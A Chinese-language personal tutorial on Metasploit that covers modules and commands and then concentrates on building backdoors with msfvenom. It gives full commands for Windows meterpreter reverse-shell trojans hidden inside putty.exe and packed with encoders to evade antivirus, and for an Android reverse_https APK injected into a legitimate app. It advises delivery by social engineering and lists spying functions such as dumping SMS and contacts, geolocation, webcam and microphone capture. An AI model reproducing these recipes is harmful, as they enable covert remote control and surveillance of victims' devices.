零 基本认识
1 全称：Metasploit Framework
2 简称：msf（美少妇）
3 功能：渗透测试工具
4 地位：网络安全领域最知名的工具
5 特点：
（1）集成化：什么都能干，美国著名黑客Georgia曾说：msf就差不能给我做家务。
（2）模块化（这是认识msf的关键）：整个msf就是一个个模块组成的，整体结构就是一棵树（和文件系统一样）。
（3）灵活：可以自由增删模块。
6 领域：
虽说什么都能干，但是这是一种夸张说法，另外也不见得它什么都干的好啊，msf主要事面向二进制安全的，和它配套的信息打点工具是nmap，web渗透它并不擅长，它自带了一个RAT meterpreter，这款远控很棒，但是达不到APT的程度。
总结来讲就是信息打点、web渗透、APT几乎都不用它，它的主要功能是作为一个exp数据库和制毒工厂。







一 安装（Linux下安装msf）
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
chmod 755 msfinstall && \
./msfinstall







二 如何启动和退出
1 启动
msfconsole
注：msfcli从2015年开始不支持了，Armitage是图形界面。

2 退出
exit（quit）







三 对msf的整体认识：整个msf就是一个个模块组成的，整体结构就是一棵树（和文件系统一样）。
（一）整体：
不同于某些简易工具的平级模块组织（比如emp就是19个模块），MSF模块众多（目前9382个，使用命令：use / or search /，可列举所有模块）且类别复杂（类别后面会详细介绍），以目录树为结构，比如auxiliary/dos/tcp/synflood。
（二）MSF的一级模块（show命令查看）：encoders, nops, exploits, payloads, auxiliary, post, plugins, info, options, favorites，其中一级模块是前六个，后四个不是模块而是属性
一级模块：
1 encoder: 用于对 payload 进行编码，以绕过检测或限制，避免被杀毒软件拦截。

2 nop: 生成 NOP sled（空操作指令序列），用于在缓冲区溢出攻击中帮助执行 payload。

3 exploit: 包含各种漏洞的exp。

4 payload: 制毒工厂（msfvenom）和exp的仓库。

5 auxiliary: 包含额外的功能模块，如扫描、嗅探、爆破、dos。

6 post: 提权、信息收集等。

属性：
1 plugins: 提供额外功能或增强 Metasploit 框架功能的插件。

2 info: 显示有关模块的详细信息，如描述、作者、所需选项等。

3 options: 允许配置和管理模块的参数和选项，以便定制模块的行为。

4 favorites: 用户可以将常用的模块标记为收藏，便于快速访问。
用法：
（1）首先你得在某个具体模块；
（2）favorite；
（3）可以使用favotites查看并使用。

注：前四个又是最常用的（这也是msf的两大主要功能：exp攻击器和制毒工厂），其中exploit模块和payload模块是最基本的。







四 MSF的基本命令
1 search 模块名
查询一个模块的路径

2 info 模块的路径
查看一个模块的信息，可以看到很多信息：（1）模块名全称；（2）模块路径；（3）适用的操作系统；（4）权限信息：BSD开源许可证；（5）对该漏洞的评级：excellent最高，其次great，最低manual（需调试）；（6）适用的操作系统版本；（7）基本选项；（8）帮助用户选定合适的payload；（9）对该漏洞的详细介绍；（10）该漏洞在网络漏洞数据库的URL。

3 use 模块路径
选中某个模块

4 show：
（1）show：得到十大一级模块：encoders, nops, exploits, payloads, auxiliary, post, plugins, info, options, favorites
（2）show 一级模块
注：info和options得use到某个模块，这时候 show info == info

5 set 选项 值
设置

6 expoit（run的意思）
用在两类模块里：expoit和payload。







五 使用msf exploit的一般过程（RAT一般的操作思路就是：use->set->run，中间不知道就show一下）
1 use 漏洞所对应的exploit模块；
比如：use exploit

2 （show options）set 选项 选项值；
注：这里是在设置目标端的信息，一般会设置目标IP（RHOST）、目标端口（RPORT，有默认值）、目标系统版本（target）。

3 （show payloads）set payload 模块路径；
注：exploit模块一般都有默认的payload，这一步也可以省略。

4 （show options）set 选项 选项值；
注：这里是在设置控制端的信息，一般会设置本地IP（LHOST）、本地端口（LPORT，有默认值）。

5 exploit
如果拿到shell，说明成功了。







六 使用msf制毒（msfvenom + payload）
（一）制作backdoor：这需要你对msf的payload一级模块有一定的认识，事实上虽然看上去1400多种payloads，但其实也就那么几种：
1 payload的一二级模块：
（1）一级：platform：linux、windows、android、mac、apple等。
（2）二级（有的没有）：arch：x64、x86_64（386）、mips等。

2 子模块（也不是每种paltform都有下面这些（比如android就没有bind，这是合理的，移动端几乎不可能暴露在公网上，因而bind是完全没必要的），但是总的来说有这些）：
（1）meterpreter和shell。
（2）内联（inline）和分阶段（stager）。
（3）reverse和bind。
（4）tcp还是http还是https或者tls。

总结：因而在制作后门前，你首先要弄清楚你的target的platform和arch，其次你要确定自己选择什么类型的后门，这个要视具体情况而定，一般我会选择meterpreter-stager-reverse-https，我认为这是一般情况下的最佳选择。



（二）明确C2的监听IP和端口（MSF称为LHOST，LPORT）：
注：如果你选择了bind类型的后门，那么这一步是没有必要，但是reverse我感觉更有意义，因为攻击内网主机是主要的场景。

制毒命令：
msfvenom -p <payload> LHOST=<ip addr> LPORT=<port> -f <format> -o exeutable.format

注：
0 这里是最简单的直接生成payload的命令，如果你要做免杀（相比于裸露的payload会好一点，但是实际上也免不了杀），有如下命令（选项的具体解释详见msfvenom高级）：
（1）制作以putty.exe为载体的木马：msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.43.223 LPORT=4444 -x putty.exe -k -f exe -o p.exe
（2）制作加壳病毒：msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.43.223 LPORT=4444 -e x64/xor_dynamic -i 10 -f exe -o p.exe
（3）通过raw制作加壳病毒（使用encoder模块加壳（cmd/powershell_base64和x86/shikata_ga_nai（覆水难收）比较好））：
第一步：msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.43.223 LPORT=4444 -e x64/xor_dynamic -i 10 -f raw -o p.bin
第二步：msfvenom -p - < p.bin -a x64 --platform windows -e x64/xor_dynamic -i 5 -f exe -o p.exe
注意：基于raw文件在制作可执行文件时也得看raw的payload（arch、platform）。
（4）制作以putty.exe为载体的加壳木马：
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.43.223 LPORT=4444 -x putty.exe -k -e x86/shikata_ga_nai -i 10 -f exe -o p.exe
（5）通过raw制作以putty.exe为载体的加壳木马（使用encoder模块加壳（cmd/powershell_base64和x86/shikata_ga_nai（覆水难收）比较好））：
第一步：msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.43.223 LPORT=4444 -e x64/xor_dynamic -i 10 -f raw -o p.bin
第二步：msfvenom -p - < p.bin -a x64 --platform windows -x putty.exe -k -e x64/xor_dynamic -i 5 -f exe -o p.exe
注意：基于raw文件在制作可执行文件时也得看raw的payload（arch、platform）。

1 msfvenom是一个独立于msfconsole的工具，没必要非在msf环境中执行。

2 比如你的target的platform是linux，你就直接linux/......就行了。
（1）<payload>不要带payload，不要带payload，不要带payload，-p就已经说明是payload这个模块了。
（2）也不要带/。



（三）在C2上起RAT：
use <payload>;
show options;
set LHOST "C2的IP，注意有的云主机NAT了，因而其公网IP地址不是主机IP地址，要使用ip a获取真实的IP地址";
set LPORT "和msfvenom设置的LPORT保持一致";
exploit [-j];   // -j表示在后台运行



（四）通过社工或者漏洞的方式将exeutable.file放在target上执行，成功的关键在于关键在于免杀。



（五）如果你不想进行复杂的APT，那么这个后门足够了，你可以愉快地远控target了。



（六）相关命令
1 session：你可以使用sessions命令管理任一meterpreter会话或shell会话：
（1）如何展示当前所有会话？可以展示出session_id等信息。
sessions，sessions -l，sessions -t
注：sessions -t可以根据类型过滤会话，比如只展示shell会话：sessions -t shell
（2）查看当前在哪个会话
sessions -c
（3）切换到某个会话
sessions -i <session_id>
（4）结束某个会话
sessions -k <session_id>
（5）结束所有会话
sessions -K
（6）在后台执行会话
sessions -b <session_id>

2 jobs：管理监听器：
（1）显示当前的监听器：
jobs
（2）删除某个监听器：
jobs -k <job_id>



（七）以我个人感兴趣的安卓渗透为例：
1 查看payload有哪些：use payload/android/，有如下：
   0  payload/android/meterpreter_reverse_http   .                normal  No     Android Meterpreter Shell, Reverse HTTP Inline
   1  payload/android/meterpreter_reverse_https  .                normal  No     Android Meterpreter Shell, Reverse HTTPS Inline
   2  payload/android/meterpreter_reverse_tcp    .                normal  No     Android Meterpreter Shell, Reverse TCP Inline
   3  payload/android/meterpreter/reverse_http   .                normal  No     Android Meterpreter, Android Reverse HTTP Stager
   4  payload/android/meterpreter/reverse_https  .                normal  No     Android Meterpreter, Android Reverse HTTPS Stager
   5  payload/android/meterpreter/reverse_tcp    .                normal  No     Android Meterpreter, Android Reverse TCP Stager
   6  payload/android/shell/reverse_http         .                normal  No     Command Shell, Android Reverse HTTP Stager
   7  payload/android/shell/reverse_https        .                normal  No     Command Shell, Android Reverse HTTPS Stager
   8  payload/android/shell/reverse_tcp          .                normal  No     Command Shell, Android Reverse TCP Stager

2 选择一款，假设你选的payload/android/meterpreter/reverse_https：
use payload/android/meterpreter/reverse_https

3 生成：
msfvenom -p android/meterpreter/reverse_https LHOST=<ip addr> LPORT=<port> -o exeutable.apk

4 设置监听：
show options
ip a
set LHOST <ip addr>
set LPORT <port>
exploit

5 免杀
java -jar a520ApkHook-1.0-jar-with-dependencies.jar -o 想进行注入的App.apk exeutable.apk

6 社工

7 MSF meterepreter about Android：
Core Commands
=============
    Command                   Description
    -------                   -----------
    ?                         帮助菜单
    background         后台运行
    bg                        背景别名
    bgkill                    杀死后台Meterpreter脚本
    bglist                    列出正在运行的后台脚本
    bgrun                     作为后台线程执行Meterpreter脚本
    channel                   显示信息或控制活动通道
    close                     关闭频道
    detach                    分离MeterMeter会话（对于http/https）
    disable_unicode_encoding  禁用unicode字符串的编码
    enable_unicode_encoding   启用unicode字符串的编码
    exit                      终止MeterMeter会话
    get_timeouts              获取当前会话超时值
    guid                      获取会话GUID
    help                      帮助菜单
    info                      显示有关Post模块的信息
    irb                       在当前会话上打开一个交互式Ruby shell
    load                      加载一个或多个流量计扩展
    machine_id                获取连接到会话的计算机的MSF ID
    pry                       在当前会话上打开Pry调试器
    quit                      终止MeterMeter会话
    read                      从通道读取数据
    resource                  运行存储在文件中的命令
    run                       执行MeterMeter脚本或Post模块
    secure                    （重新）协商会话上的TLV数据包加密
    sessions                  快速切换到另一个会话
    set_timeouts              设置当前会话超时值
    sleep                     强制MeterMeter安静，然后重新建立会话
    transport                 管理运输机制
    use                       “加载”的不推荐别名
    uuid                      获取当前会话的UUID
    write                     将数据写入通道
Stdapi: File system Commands
============================
    Command       Description
    -------       -----------
    cat           将文件内容读取到屏幕上
    cd            更改目录
    checksum      检索文件的校验和
    cp            将源复制到目标
    del           删除指定的文件
    dir           列出文件（ls的别名）
    download      下载文件或目录
    edit          编辑文件
    getlwd        打印本地工作目录
    getwd         打印工作目录
    lcd           更改本地工作目录
    lls           列出本地文件
    lpwd          打印本地工作目录
    ls            列出文件
    mkdir         制作目录
    mv            将源移动到目标
    pwd           打印工作目录
    rm            删除指定的文件
    rmdir         删除目录
    search        搜索文件
    upload        上传文件或目录
Stdapi: Networking Commands
===========================
    Command       Description
    -------       -----------
    ifconfig      显示界面
    ipconfig      显示界面
    portfwd       将本地端口转发到远程服务
    route         查看和修改路由表
Stdapi: System Commands
=======================
    Command       Description
    -------       -----------
    execute       执行命令
    getenv        获取一个或多个环境变量值
    getuid        获取运行服务器的用户
    localtime     显示目标系统本地日期和时间
    pgrep         按名称筛选进程
    ps            列出正在运行的进程
    shell         放入系统命令外壳
    sysinfo       获取有关远程系统的信息，例如操作系统
Stdapi: User interface Commands
===============================
    Command       Description
    -------       -----------
    screenshare   实时观察远程用户桌面
    screenshot    抓取交互式桌面的屏幕截图
Stdapi: Webcam Commands
=======================
    Command        Description
    -------        -----------
    record_mic     从默认麦克风录制音频X秒
    webcam_chat    开始视频聊天
    webcam_list    列出网络摄像头
    webcam_snap    从指定的网络摄像头拍摄快照
    webcam_stream  从指定的网络摄像头播放视频流
Stdapi: Audio Output Commands
=============================
    Command       Description
    -------       -----------
    play          在目标系统上播放波形音频文件（.wav）
Android Commands
================
    Command           Description
    -------           -----------
    activity_start    从Uri字符串启动Android活动
    check_root        检查设备是否root
    dump_calllog      获取通话记录
    dump_contacts     获取联系人列表
    dump_sms          获取短信
    geolocate         使用地理定位获取当前经纬度，表示格式为：longitude,latitude，不管经度还是维度，个位的精度是111公里，小数点后一位是11公里，往后依次减一个0，一般的地图软件到第6位分米级别。
    hide_app_icon     从启动器中隐藏应用程序图标
    interval_collect  管理间隔收集功能
    send_sms          从目标会话发送短信
    set_audio_mode    设置振铃器模式
    sqlite_query      从存储器中查询SQLite数据库
    wakelock          启用/禁用Wakelock
    wlan_geolocate    使用WLAN信息获取当前经纬度
Application Controller Commands
===============================
    Command        Description
    -------        -----------
    app_install    使用WLAN信息获取当前lat long
    app_list       列出设备中已安装的应用程序
    app_run        启动包名称的主活动
    app_uninstall  请求卸载应用程序

8 经验之谈：目标机Nova7
（1）stager的表现好于inline，inline连一下就死，stager连上后目标机上的程序会在一段时间（几十秒不等）退出，然后连接死掉，用户再次触发程序恢复正常；
（2）http(s)的表现好于tcp，不会过一会断掉但是会过一会显示命令执行超时，用户再次触发程序则又恢复正常。
（3）520很失败，虽然能上线，但破坏了原程序功能。







七 命令
（一）help（?）
1 查看msf的命令；
help <command>

2 查看该命令功能；

3 <command> -h
查看该命令功能；



（二）connect（相当于nc的客户端）
    -c, --comm <comm>               Specify which Comm to use.（这是啥意思？）
    -C, --crlf                      Try to use CRLF for EOL sequence.
    -h, --help                      Help banner.
    -i, --send-contents <file>      Send the contents of a file.
    -p, --proxies <proxies>         List of proxies to use.（那如何使用proxy呢？）
    -P, --source-port <port>        Specify source port.
    -S, --source-address <address>  Specify source address.
    -s, --ssl                       Connect with SSL.
    -u, --udp                       Switch to a UDP socket.
    -w, --timeout <seconds>         Specify connect timeout.
    -z, --try-connection            Just try to connect, then return.







八 msfvenom高级
（一）-f概览
1 Framework Executable Formats:
asp, aspx：ASP.NET Web 应用程序格式
axis2：Apache Axis2 Web服务框架格式
dll：动态链接库格式
elf, elf-so：Linux可执行格式和共享对象格式
exe, exe-only, exe-service, exe-small：Windows可执行格式,包括标准可执行文件、纯可执行文件、Windows服务和精简版
hta-psh, psh, psh-cmd, psh-net, psh-reflection：PowerShell脚本格式
jar：Java档案格式
jsp：Java Server Pages Web应用程序格式
loop-vbs：VBScript 循环格式
macho：macOS可执行格式
msi, msi-nouac：Windows安装程序格式,包括标准和无需管理员权限的版本
osx-app：macOS应用程序格式
vba, vba-exe, vba-psh：Visual Basic for Applications脚本格式
vbs：VBScript格式
war：Java Web应用程序归档格式

2 Framework Transform Formats:
这些格式用于将shellcode转换为其他语言、编码的格式等。
它们包括base32、base64、bash、c、csharp、dw、dword、go、golang、hex、java、js_be、js_le、masm、nim、nimlang、num、octal、perl、pl、powershell、ps1、py、python、raw、rb、ruby、rust、rustlang、sh、vbapplication、vbscript、zig等。



（二）-x <template>
将病毒植入正常程序。



（三）-k
避免卡顿



（四）-e <encoder>
1 指定编码器.
2 可以使用 msfvenom -l encoders 查看所有的encoder。 
3 比较好的encoder：
（1）cmd/powershell_base64
（2）x86/shikata_ga_nai



（五）-i <num>
指定迭代次数。



（六）-f raw
生成原始shellcode，生成的shellcode可以作为exe、elf等其他格式文件的原始文件。



（七）-a <arch>



（八）--platform <platform>



（九）-o == >
输出文件。



（十）< <file>
导入文件
